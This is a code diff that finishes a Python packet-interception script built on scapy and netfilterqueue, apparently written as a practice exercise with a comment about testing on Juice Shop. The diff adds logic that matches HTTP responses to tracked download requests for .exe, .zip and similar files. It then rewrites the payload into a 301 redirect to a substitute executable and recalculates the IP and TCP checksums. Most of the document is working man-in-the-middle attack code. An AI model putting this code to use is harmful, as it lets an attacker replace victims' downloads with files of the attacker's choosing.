@@ -4,7 +4,7 @@ import netfilterqueue
 from scapy.layers.inet import IP, TCP
 from scapy.layers.dns import Raw
 
-extensions = [".exe",".url",".zip",".pdf",".json",".md",".yml","","","",]
+extensions = [".exe",".url",".zip",".pdf",".json",".md",".yml"]
 ack_list = []
 
 def process_packet(packet):
@@ -23,34 +23,23 @@ def process_packet(packet):
             elif scapy_packet[TCP].sport == 80:
                 print("[+] This is a HTTP Response: ")
                 if scapy_packet[TCP].seq:
+                    # print(scapy_packet.show())
                     print("[+] Here is our Sequence Number: ")
                     print(scapy_packet[TCP].seq)
                     if scapy_packet[TCP].seq in ack_list:
+                        # print(scapy_packet.show())
+                        ack_list.remove(scapy_packet[TCP].seq)
                         print("[+] Replacing File: ")
-                        # ********** TODO
-                        # code to replace file here
-                        # ********** TODO
-
-            # NOTE TO SELF!  We do not need to make code human readable
-            # **********
-            # print(scapy_packet.show())
-            # load = str(scapy_packet[Raw].load)
-            # print("[+] Load set to a string:")
-            # print(load)
-
-            # ********** TODO
-            # Test this locally on Juice Shop
-            # ********** TODO
-            # now I know i do not need to make code human readable
-            # Cannot unencrypt load, which shows as Broken binary.
-            # if scapy_packet[TCP].dport == 443:
-            #     print("\n\n[+] This is a HTTPS Request: ")
-            #     print(scapy_packet.show())
-            # elif scapy_packet[TCP].sport == 443:
-            #     print("\n\n[+] This is a HTTPS Response: ")
-            #     print(scapy_packet.show())
-
+                        # Tell the Target machine, the download link has moved permanently 301 to our download link
+                        scapy_packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-722.exe\n\n"
+                        # Force scapy to recalculate these values for our updated load
+                        del scapy_packet[IP].len
+                        del scapy_packet[IP].chksum
+                        del scapy_packet[TCP].chksum
+                        # Modify the packet that will be sent to the target.
+                        packet.set_payload(str(scapy_packet))
     packet.accept()
+
 
 if __name__ == "__main__":
     queue = netfilterqueue.NetfilterQueue()
